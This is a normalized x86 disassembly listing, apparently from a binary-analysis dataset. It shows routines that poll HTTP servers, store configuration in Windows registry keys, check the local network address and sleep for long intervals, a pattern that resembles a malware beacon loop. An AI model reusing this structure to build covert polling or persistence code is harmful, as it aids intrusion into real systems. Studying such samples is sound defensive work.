mov [ ebp - 0x28 ] esi
mov [ ebp - 0x20 ] ebx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x1c ] edx
call sub_100017ca
pop ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_10005001
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
push 0x401
mov edi ecx
call sub_10003f3c
push 0xa
push r--data
mov [ ebp - 0x10 ] eax
call sub_100030d1
mov ecx [ edi ]
add esp 0xc
mov ebx eax
mov [ ebp - 0x14 ] ebx
push 0x5
push 0x6
call sub_10003dfa
push 0x7
push 0x1
mov [ ebp - 0xc ] eax
call sub_10003de0
pop ecx
pop ecx
mov ecx [ edi ]
push eax
call sub_10003e73
push 0x7
push 0x0
mov [ ebp - 0x8 ] eax
call sub_10003de0
push 0x3
push 0x1
mov esi eax
call sub_10003de0
mov ecx [ edi ]
add esp 0x10
push eax
call sub_10003e73
push 0x0
push ebx
mov [ ebp - 0x4 ] eax
call sub_10002d28
pop ecx
push eax
push ebx
call sub_10003123
imul ecx esi 0x1f
mov ebx eax
push 0x1f
add ecx r--data
push ecx
call sub_100030d1
push 0xe
push r--data
mov edi eax
call sub_100030d1
push ebx
push [ ebp - 0x4 ]
mov esi eax
push edi
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push esi
push [ ebp - 0x10 ]
call [ wsprintfA@IAT ]
push esi
call j_sub_10003f1b
push edi
call j_sub_10003f1b
add esp 0x40
push ebx
call j_sub_10003f1b
push [ ebp - 0x4 ]
call j_sub_10003f1b
push [ ebp - 0x8 ]
call j_sub_10003f1b
push [ ebp - 0xc ]
call j_sub_10003f1b
push [ ebp - 0x14 ]
call j_sub_10003f1b
add esp 0x14
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100050fd
push ebp
mov ebp esp
sub esp 0x18
push esi
push [ ebp + 0x8 ]
xor esi esi
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] esi
call sub_1000486b
cmp eax 0xc8
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_1000484b
pop ecx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0xc ] 0x4
mov [ ebp + 0x8 ] esi
cmp [ ebp - 0x10 ] esi
je r-xdata
push esi
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x20000005
push [ ebp - 0x10 ]
call [ HttpQueryInfoA@IAT ]
cmp [ ebp + 0x8 ] 0x24
jbe r-xdata
push edi
push [ ebp + 0x8 ]
call sub_10003f3c
mov [ ebp - 0x8 ] eax
mov edi esi
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0x8 ]
pop ecx
push 0x0
cmp edi eax
mov edi [ ebp - 0x8 ]
pop esi
jne r-xdata
cmp edi eax
jb r-xdata
push edi
call j_sub_10003f1b
pop ecx
pop edi
push [ ebp + 0xc ]
push eax
push edi
call sub_10002ffb
add esp 0xc
mov esi eax
lea ecx [ ebp - 0x4 ]
push ecx
push eax
lea eax [ edi + esi ]
push eax
push [ ebp - 0x10 ]
call [ InternetReadFile@IAT ]
add edi [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
je r-xdata
sub_100051c0
push ebp
mov ebp esp
sub esp 0x3c
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x4 ] esi
call sub_10005001
push 0x4
push r--data
mov [ ebp - 0x14 ] eax
call sub_100030d1
pop ecx
pop ecx
mov ecx esi
mov [ ebp - 0x10 ] eax
call sub_100053c4
mov ecx esi
mov ebx eax
call sub_10005422
mov ecx esi
mov [ ebp - 0xc ] eax
call sub_10005414
mov esi eax
lea edi [ ebp - 0x38 ]
push 0x3
pop eax
xor edx edx
test ebx ebx
push 0x9
cmovne edx eax
xor eax eax
pop ecx
[ edi ]
mov ecx [ ebp - 0x4 ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x28 ] esi
mov esi [ ebp - 0x10 ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x3c ] eax
mov eax [ ecx + 0x8 ]
xor ecx ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x38 ] edx
push eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] ecx
call sub_100016c8
push esi
mov ebx eax
call j_sub_10003f1b
push edi
call j_sub_10003f1b
mov edi [ ebp - 0x4 ]
add esp 0x10
xor esi esi
test ebx ebx
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp - 0x8 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
cmp [ ebx ] 0x32
jne r-xdata
push [ ebp + 0xc ]
mov [ edi + 0x22 ] 0x1
push [ ebp - 0x8 ]
push ebx
call sub_10002ffb
add esp 0xc
mov esi eax
mov eax [ ebp + 0xc ]
mov [ edi + 0x22 ] 0x1
push ebx
mov [ eax ] esi
call sub_10002a8f
pop ecx
mov ebx esi
sub_100052b7
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov esi ecx
xor ebx ebx
push 0x11
push r--data
mov [ ebp - 0x14 ] esi
call sub_100030d1
pop ecx
pop ecx
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
push ecx
push eax
mov ecx esi
mov [ ebp - 0x8 ] ebx
call sub_1000553d
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call j_sub_10003f1b
pop ecx
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
push edi
push 0x9
push r--data
call sub_100030d1
mov esi [ lstrlenA@IAT ]
pop ecx
pop ecx
push eax
mov [ ebp - 0xc ] eax
call esi
push [ ebp - 0x4 ]
lea edi [ eax + 0x1 ]
call esi
add eax edi
push eax
call sub_10003f3c
push [ ebp - 0x4 ]
mov esi eax
push [ ebp - 0xc ]
mov [ ebp - 0x20 ] esi
push esi
call [ wsprintfA@IAT ]
push 0x2
push r--data
call sub_100030d1
mov edi eax
push 0x6
push r--data
mov [ ebp - 0x1c ] edi
call sub_100030d1
add esp 0x20
mov [ ebp - 0x18 ] eax
push 0xe
push r--data
push eax
push edi
mov edi [ ebp - 0x10 ]
push esi
push [ ebp - 0x8 ]
mov esi [ ebp - 0x14 ]
mov ecx esi
push edi
call sub_10005954
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
push [ ebp - 0x18 ]
call j_sub_10003f1b
push [ ebp - 0x1c ]
call j_sub_10003f1b
push [ ebp - 0x20 ]
call j_sub_10003f1b
push [ ebp - 0xc ]
call j_sub_10003f1b
push edi
call sub_10002a8f
add esp 0x14
pop edi
cmp [ esi + 0x8 ] ebx
je r-xdata
mov [ esi + 0x8 ] eax
mov bl 0x1
push [ esi + 0x8 ]
call sub_10002a8f
mov eax [ ebp - 0x14 ]
pop ecx
sub_100053d2
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov eax ecx
xor ebx ebx
push edi
mov [ ebp - 0x4 ] eax
mov esi ebx
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov ecx edi
call [ eax + 0x4 ]
test al al
mov eax [ ebp - 0x4 ]
jne r-xdata
mov [ eax + 0x1c ] edi
mov bl 0x1
inc esi
cmp si 0x5
jb r-xdata
mov eax [ eax + 0x18 ]
movzx edx si
mov edi [ eax + edx * 4 ]
test edi edi
je r-xdata
jmp r-xdata
sub_10005430
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push 0x43
push r--data
xor edi edi
call sub_100030d1
and [ ebp - 0x4 ] edi
mov esi eax
mov ebx [ RegOpenKeyExA@IAT ]
lea eax [ ebp - 0x4 ]
pop ecx
pop ecx
push eax
push 0x1
push edi
push esi
push 0x80000002
call ebx
test eax eax
je r-xdata
push esi
call j_sub_10003f1b
push 0x6
push r--data
call sub_100030d1
mov esi [ RegQueryValueExA@IAT ]
add esp 0xc
mov ebx eax
xor ecx ecx
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
push eax
push ecx
push ecx
push ecx
push ebx
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push edi
push esi
push 0x80000001
call ebx
push ebx
call j_sub_10003f1b
pop ecx
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push [ ebp - 0x8 ]
call sub_10003f3c
pop ecx
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push 0x0
push 0x0
push ebx
push [ ebp - 0x4 ]
call esi
push 0x8
call sub_10003f3c
mov esi eax
push 0x2c
push r--data
mov [ ebp - 0x10 ] esi
call sub_100030d1
mov [ esi ] eax
lea eax [ ebp - 0xc ]
and [ ebp - 0xc ] 0x0
push eax
push [ ebp - 0x8 ]
push edi
call sub_10002ede
push edi
mov esi eax
call j_sub_10003f1b
mov ecx [ ebp - 0xc ]
inc ecx
push ecx
call sub_10003f3c
mov edi [ ebp - 0x10 ]
mov [ edi + 0x4 ] eax
push [ ebp - 0xc ]
push esi
push eax
call sub_10003271
push esi
call j_sub_10003f1b
mov eax [ ebp + 0x8 ]
add esp 0x30
mov [ eax ] 0x2
sub_1000553d
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
and [ eax ] 0x0
push 0xe
push r--data
mov [ ebp - 0xc ] ecx
call sub_100030d1
push 0x3
push r--data
mov ebx eax
call sub_100030d1
push 0x1b
push r--data
mov [ ebp - 0x4 ] eax
call sub_100030d1
mov edi [ lstrlenA@IAT ]
add esp 0x18
mov [ ebp - 0x8 ] eax
push eax
call edi
push [ ebp + 0x8 ]
mov esi eax
call edi
lea ecx [ eax + 0x1 ]
add ecx esi
push ecx
call sub_10003f3c
push [ ebp + 0x8 ]
mov esi eax
push [ ebp - 0x8 ]
push esi
call [ wsprintfA@IAT ]
mov eax [ ebp - 0xc ]
add esp 0x10
mov edi [ ebp - 0x4 ]
mov ecx eax
cmp [ eax + 0x20 ] 0x0
push [ ebp + 0xc ]
je r-xdata
push edi
push 0x0
push esi
push ebx
call sub_10004e16
push 0x0
push edi
push 0x0
push esi
push ebx
call sub_10004f6f
jmp r-xdata
push esi
mov [ ebp + 0xc ] eax
call j_sub_10003f1b
push [ ebp - 0x8 ]
call j_sub_10003f1b
push edi
call j_sub_10003f1b
push ebx
call j_sub_10003f1b
mov eax [ ebp + 0xc ]
add esp 0x10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_10005600
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
call sub_10004627
mov [ edi + 0x14 ] eax
call sub_1000418d
push 0x10
mov [ edi + 0x4 ] eax
call sub_10003f04
xor esi esi
pop ecx
test eax eax
je r-xdata
mov eax esi
mov ecx eax
call sub_10006879
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x8
mov [ ebx ] 0x2
call sub_1000295a
pop ecx
mov [ edi + 0xc ] eax
cmp [ ebx ] esi
jbe r-xdata
push eax
mov ecx edi
call sub_10005ae1
lea ebx [ edi + 0x10 ]
mov ecx edi
push ebx
call sub_10005430
mov [ edi + 0xc ] eax
cmp [ ebx ] esi
jne r-xdata
mov eax r--data
mov [ ebp - 0x4 ] eax
push 0x2c
push eax
call sub_100030d1
pop ecx
pop ecx
mov ecx [ edi + 0xc ]
mov [ ecx + esi * 4 ] eax
inc esi
mov eax [ ebp - 0x4 ]
add eax 0x2c
mov [ ebp - 0x4 ] eax
cmp esi [ ebx ]
jb r-xdata
sub_100056ad
push esi
mov esi ecx
push edi
xor edi edi
cmp [ esi + 0x10 ] edi
jbe r-xdata
push [ esi + 0xc ]
call sub_10002a8f
push 0x8
call sub_1000295a
push 0x2c
push r--data
mov [ esi + 0xc ] eax
call sub_100030d1
mov ecx [ esi + 0xc ]
mov [ ecx ] eax
push [ esi + 0x8 ]
call sub_10002d28
inc eax
push eax
push [ esi + 0x8 ]
call sub_10002ae7
mov ecx [ esi + 0xc ]
add esp 0x1c
mov [ ecx + 0x4 ] eax
xor eax eax
pop edi
mov [ esi + 0x21 ] 0x0
inc eax
pop esi
retn
mov eax [ esi + 0xc ]
push [ eax + edi * 4 ]
call sub_10002a8f
inc edi
pop ecx
cmp edi [ esi + 0x10 ]
jb r-xdata
sub_10005712
push ebp
mov ebp esp
sub esp 0x190
lea eax [ ebp - 0x190 ]
push ebx
push esi
push edi
push 0x190
xor ebx ebx
push ebx
push eax
call sub_10003296
add esp 0xc
lea eax [ ebp - 0x190 ]
push eax
push 0x202
call WSAStartup
mov esi 0x104
push esi
call sub_10003f3c
pop ecx
mov edi eax
push esi
push edi
call gethostname
test eax eax
jne r-xdata
push edi
call j_sub_10003f1b
pop ecx
call WSACleanup
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
push edi
call gethostbyname
test eax eax
je r-xdata
mov esi [ eax + 0xc ]
mov edx ebx
cmp [ esi ] ebx
je r-xdata
mov eax ebx
cmp [ eax ] 0x100007f
jne r-xdata
mov ecx [ eax ]
shr ecx 0x8
cmp cl 0xfe
je r-xdata
mov bl 0x1
inc edx
mov eax edx
shl eax 0x2
cmp [ eax + esi ] ebx
jne r-xdata
mov eax [ eax + esi ]
cmp [ eax ] 0xa9
jne r-xdata
jmp r-xdata
sub_100057b2
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor esi esi
inc ebx
cmp [ edi + 0x10 ] esi
jbe r-xdata
cmp [ edi + 0x10 ] ebx
jbe r-xdata
mov eax [ edi + 0xc ]
push [ eax + esi * 4 ]
push [ edi + 0x8 ]
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
mov ecx edi
call sub_1000568e
mov eax [ edi + 0xc ]
push [ eax + 0x4 ]
call sub_10002d28
inc eax
push eax
mov eax [ edi + 0xc ]
push [ eax + 0x4 ]
cmp [ edi + 0x8 ] 0x0
je r-xdata
inc esi
cmp esi [ edi + 0x10 ]
jb r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
retn
mov ecx [ edi + 0x10 ]
lea eax [ ecx - 0x1 ]
cmp esi eax
jne r-xdata
push [ edi + 0x8 ]
call j_sub_10003f1b
and [ edi + 0x8 ] 0x0
pop ecx
xor edx edx
lea eax [ esi + 0x1 ]
div ecx
mov eax [ edi + 0xc ]
push [ eax + edx * 4 ]
call sub_10002d28
inc eax
xor edx edx
push eax
lea eax [ esi + 0x1 ]
div [ edi + 0x10 ]
mov eax [ edi + 0xc ]
push [ eax + edx * 4 ]
jmp r-xdata
cmp ecx ebx
jbe r-xdata
call sub_10002ae7
add esp 0xc
mov [ edi + 0x8 ] eax
jmp r-xdata
mov ecx edi
call sub_1000568e
mov eax [ edi + 0xc ]
push [ eax + 0x4 ]
call sub_10002d28
inc eax
push eax
mov eax [ edi + 0xc ]
push [ eax + 0x4 ]
call sub_10002ae7
add esp 0xc
mov [ edi + 0x8 ] eax
jmp r-xdata
xor ebx ebx
jmp r-xdata
sub_10005880
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push 0x2
push r--data
mov edi ecx
call sub_100030d1
push [ ebp + 0xc ]
mov esi eax
mov [ ebp - 0x4 ] esi
call sub_10002d28
add esp 0xc
mov ebx eax
mov [ ebp - 0x8 ] ebx
push esi
call [ lstrlenA@IAT ]
push [ ebp + 0x8 ]
mov esi eax
call sub_10002d28
add eax esi
lea ecx [ ebx + 0x8 ]
add ecx eax
push ecx
call sub_10003f3c
push esi
push [ ebp - 0x4 ]
mov ebx eax
push ebx
call sub_10003271
push 0x1
lea ecx [ ebx + esi ]
push r--data
push ecx
call sub_10003271
inc esi
lea eax [ edi + 0x14 ]
push 0x4
push eax
lea eax [ esi + ebx ]
push eax
call sub_10003271
push [ ebp + 0x8 ]
add esi 0x4
mov [ ebp - 0x10 ] 0x3d732526
lea eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] 0x0
push eax
lea eax [ esi + ebx ]
push eax
call [ wsprintfA@IAT ]
mov edi [ ebp - 0x8 ]
add esi eax
push edi
push [ ebp + 0xc ]
lea eax [ esi + ebx ]
push eax
call sub_10003271
add esp 0x44
lea eax [ esi + edi ]
push 0x1
push eax
push ebx
call sub_10003123
push ebx
mov esi eax
call j_sub_10003f1b
push [ ebp - 0x4 ]
call j_sub_10003f1b
add esp 0x14
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_10005954
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
test esi esi
je r-xdata
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
je r-xdata
cmp [ ebp + 0x18 ] ebx
je r-xdata
push edi
push [ ebp + 0x10 ]
mov edi [ lstrlenA@IAT ]
call edi
push [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
call edi
mov [ ebp + 0x8 ] eax
mov edi ebx
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
add eax esi
mov [ ebp + 0xc ] eax
push 0x0
pop ebx
test edi edi
je r-xdata
cmp esi eax
jae r-xdata
pop edi
push [ ebp + 0x18 ]
call [ lstrlenA@IAT ]
push [ ebp + 0x18 ]
add edi eax
push edi
call sub_100032e2
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_100032e2
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
lea ecx [ ebp + 0x10 ]
mov [ ebp + 0x10 ] ebx
push ecx
sub eax edi
push eax
push edi
call sub_10002ede
push [ ebp + 0x20 ]
mov ebx eax
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push ebx
call sub_10002d31
mov ecx [ ebp + 0x10 ]
inc ecx
push ecx
push ebx
call sub_10002aad
add esp 0x24
mov eax [ ebp + 0xc ]
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
add eax esi
push eax
call sub_10002d18
push ebx
push [ ebp + 0x14 ]
mov esi eax
push esi
call sub_10002971
add esp 0x10
test eax eax
jne r-xdata
test esi esi
je r-xdata
lea eax [ esi + ebx ]
push eax
call sub_10002d18
pop ecx
mov edi eax
sub_10005a54
push esi
push edi
mov esi ecx
call sub_1000568e
push [ esi + 0x4 ]
mov [ esi + 0x20 ] 0x0
call [ lstrlenA@IAT ]
push eax
push [ esi + 0x4 ]
call sub_10002f22
pop ecx
pop ecx
mov edi eax
mov ecx esi
push edi
call sub_10005bed
test eax eax
je r-xdata
mov ecx esi
call sub_100053d2
test al al
je r-xdata
push edi
mov ecx esi
call sub_10004829
push edi
mov ecx esi
call sub_10005c35
push edi
test eax eax
je r-xdata
push edi
mov ecx esi
call sub_10005bed
push edi
test eax eax
jne r-xdata
call j_sub_10003f1b
pop ecx
pop edi
xor eax eax
pop esi
retn
mov [ esi + 0x20 ] 0x1
jmp r-xdata
call j_sub_10003f1b
pop ecx
pop edi
mov ecx esi
pop esi
jmp sub_100057b2
mov ecx esi
call sub_10005c35
test eax eax
je r-xdata
mov [ esi + 0x20 ] 0x1
jmp r-xdata
sub_10005ae1
push ebp
mov ebp esp
push esi
mov esi [ ecx + 0x18 ]
xor edx edx
mov eax [ ebp + 0x8 ]
movzx ecx dx
mov [ esi + ecx * 4 ] eax
inc edx
cmp dx 0x5
jb r-xdata
movzx eax dx
cmp [ esi + eax * 4 ] 0x0
je r-xdata
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_10005b0a
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x43
push r--data
call sub_100030d1
mov esi [ RegCreateKeyExA@IAT ]
xor edi edi
pop ecx
pop ecx
push edi
mov ebx eax
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ebx
push eax
push edi
push 0x2
push edi
push edi
push edi
push ebx
push 0x80000002
call esi
test eax eax
je r-xdata
push 0x6
push r--data
call sub_100030d1
mov esi [ lstrlenA@IAT ]
mov ebx eax
pop ecx
pop ecx
push [ ebp + 0x8 ]
call esi
push eax
push [ ebp + 0x8 ]
call sub_10002f22
pop ecx
pop ecx
mov edi eax
push edi
call esi
push eax
push edi
push 0x1
push 0x0
push ebx
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
push edi
call j_sub_10003f1b
push ebx
call j_sub_10003f1b
pop ecx
pop ecx
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
push [ ebp - 0x8 ]
call j_sub_10003f1b
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push edi
lea eax [ ebp - 0x4 ]
push eax
push edi
push 0x2
push edi
push edi
push edi
push ebx
push 0x80000001
call esi
sub_10005bbe
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
xor esi esi
cmp [ ecx + 0x20 ] 0x0
je r-xdata
call sub_10005bed
xor ecx ecx
inc ecx
test eax eax
cmovne esi ecx
call sub_10005c35
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
inc esi
jmp r-xdata
sub_10005bed
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
push [ ebp + 0x8 ]
xor esi esi
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
call sub_1000486b
mov edi eax
lea eax [ ebp - 0xc ]
push eax
call sub_1000484b
pop ecx
cmp edi 0xc8
je r-xdata
xor esi esi
inc esi
cmp edi 0x194
jne r-xdata
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10005c35
push ebp
mov ebp esp
sub esp 0x3c
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x8 ] esi
call sub_10005001
push 0x4
push r--data
mov [ ebp - 0x14 ] eax
call sub_100030d1
pop ecx
pop ecx
mov ecx esi
mov [ ebp - 0x10 ] eax
call sub_100053c4
mov ecx esi
mov ebx eax
call sub_10005422
mov ecx esi
mov [ ebp - 0xc ] eax
call sub_10005414
mov esi eax
lea edi [ ebp - 0x38 ]
push 0x3
pop eax
xor edx edx
test ebx ebx
push 0x9
cmovne edx eax
xor eax eax
pop ecx
[ edi ]
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x34 ] ebx
xor ebx ebx
mov [ ebp - 0x28 ] esi
mov eax [ ecx + 0x4 ]
mov esi [ ebp - 0x10 ]
mov [ ebp - 0x3c ] eax
mov eax [ ecx + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x38 ] edx
push eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
call sub_10001ee5
push esi
mov [ ebp + 0x8 ] eax
call j_sub_10003f1b
push edi
call j_sub_10003f1b
mov eax [ ebp + 0x8 ]
add esp 0x10
test eax eax
je r-xdata
push eax
call sub_10002a8f
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor ecx ecx
inc ecx
cmp [ ebp - 0x4 ] ecx
jne r-xdata
cmp [ eax ] 0x32
cmove ebx ecx
sub_10005d0a
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
mov ebx ecx
push edi
mov [ ebp - 0x10 ] ebx
call sub_10005712
mov esi [ Sleep@IAT ]
mov edi 0x2710
jmp r-xdata
cmp al 0x1
jne r-xdata
push edi
call esi
call sub_10005712
mov ecx ebx
call sub_10005600
jmp r-xdata
mov ecx ebx
call sub_10005a54
test eax eax
je r-xdata
push edi
call esi
mov ecx ebx
call sub_100049aa
mov edi eax
jmp r-xdata
push edi
mov ecx ebx
call sub_10005bbe
test eax eax
je r-xdata
mov ecx ebx
call sub_100057b2
test eax eax
jne r-xdata
cmp [ ebx + 0x21 ] 0x0
je r-xdata
push 0x2710
call esi
mov ecx ebx
call sub_100052b7
mov [ ebx + 0x21 ] al
test al al
jne r-xdata
push edi
call j_sub_10003f1b
pop ecx
jmp r-xdata
push [ ebx + 0x8 ]
mov ecx ebx
call sub_10005b0a
mov ecx ebx
call sub_100056ad
push 0x1b7740
call esi
call sub_10005712
cmp al 0x1
jne r-xdata
push 0x2710
jmp r-xdata
mov ecx ebx
call sub_10005a54
test eax eax
je r-xdata
push 0x2710
call esi
push 0x1
push r--data
call sub_100030d1
mov edi eax
push 0x1
push r--data
mov [ ebp - 0x14 ] edi
call sub_100030d1
add esp 0x10
mov [ ebp - 0x28 ] eax
mov ecx ebx
push eax
push edi
call sub_10005880
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] eax
mov [ ebx + 0x22 ] 0x0
call sub_100050fd
mov edi eax
mov [ ebp - 0x1c ] eax
call sub_100051c0
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
cmp [ ebx + 0x21 ] 0x0
je r-xdata
cmp [ ebx + 0x22 ] 0x0
jne r-xdata
test edi edi
jne r-xdata
push [ ebp - 0x4 ]
call j_sub_10003f1b
pop ecx
test edi edi
je r-xdata
push [ ebx + 0x8 ]
mov ecx ebx
call sub_10005b0a
mov ecx ebx
call sub_100056ad
mov ecx ebx
call sub_100057b2
test eax eax
jne r-xdata
push [ ebp - 0x28 ]
call j_sub_10003f1b
push [ ebp - 0x14 ]
call j_sub_10003f1b
pop ecx
pop ecx
push 0x1b7740
jmp r-xdata
push 0x18
call sub_10003f04
pop ecx
test eax eax
je r-xdata
push 0x2710
call esi
mov ecx ebx
call sub_100052b7
mov [ ebx + 0x21 ] al
test al al
jne r-xdata
call esi
xor esi esi
mov [ ebp - 0x4 ] esi
jmp r-xdata
push [ ebp - 0x8 ]
mov ecx eax
push edi
call sub_10006131
mov esi eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
lea ecx [ ebp - 0x8 ]
push ecx
push eax
mov ecx ebx
je r-xdata
cmp [ ebx + 0x22 ] 0x0
mov eax [ ebp - 0x4 ]
je r-xdata
push 0x1b7740
call esi
mov ecx esi
call sub_10006238
test al al
jne r-xdata
mov ecx esi
call sub_100061e0
mov edi eax
test edi edi
jne r-xdata
jmp r-xdata
push edi
mov ecx ebx
call sub_10005b0a
mov eax [ ebx + 0xc ]
push [ eax + 0x4 ]
call j_sub_10003f1b
mov esi [ lstrlenA@IAT ]
pop ecx
push edi
call esi
inc eax
push eax
call sub_10003f3c
pop ecx
mov ecx [ ebx + 0xc ]
push edi
mov [ ecx + 0x4 ] eax
call esi
push eax
mov eax [ ebx + 0xc ]
push edi
push [ eax + 0x4 ]
call sub_10003271
push edi
call j_sub_10003f1b
push 0x1
push r--data
call sub_100030d1
add esp 0x18
mov edi eax
mov ecx ebx
push edi
push [ ebp - 0x14 ]
call sub_10005880
mov esi eax
mov ecx ebx
push esi
call sub_10005bbe
push esi
call j_sub_10003f1b
push edi
call j_sub_10003f1b
push [ ebx + 0x8 ]
call j_sub_10003f1b
mov eax [ ebx + 0xc ]
add esp 0xc
mov esi [ lstrlenA@IAT ]
push [ eax + 0x4 ]
call esi
inc eax
push eax
call sub_10003f3c
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0xc ]
pop ecx
push [ eax + 0x4 ]
call esi
push eax
mov eax [ ebx + 0xc ]
push [ eax + 0x4 ]
push [ ebx + 0x8 ]
call sub_10003271
add esp 0xc
mov ecx ebx
call sub_100049aa
mov esi eax
mov ecx ebx
push esi
call sub_10005bbe
push esi
call j_sub_10003f1b
pop ecx
mov ecx esi
call sub_10006663
mov [ ebp - 0x18 ] eax
test eax eax
jne r-xdata
push 0x1
push r--data
call sub_100030d1
pop ecx
pop ecx
mov edi eax
mov ecx ebx
push edi
push [ ebp - 0x14 ]
call sub_10005880
mov esi eax
mov ecx ebx
push esi
call sub_10005bbe
push esi
call j_sub_10003f1b
push edi
call j_sub_10003f1b
mov esi [ ebp - 0x4 ]
pop ecx
pop ecx
test esi esi
je r-xdata
push [ ebp - 0x1c ]
call j_sub_10003f1b
mov esi [ Sleep@IAT ]
pop ecx
mov ecx esi
call sub_10006160
push esi
call sub_10003f1b
pop ecx
push 0x1
push r--data
call sub_100030d1
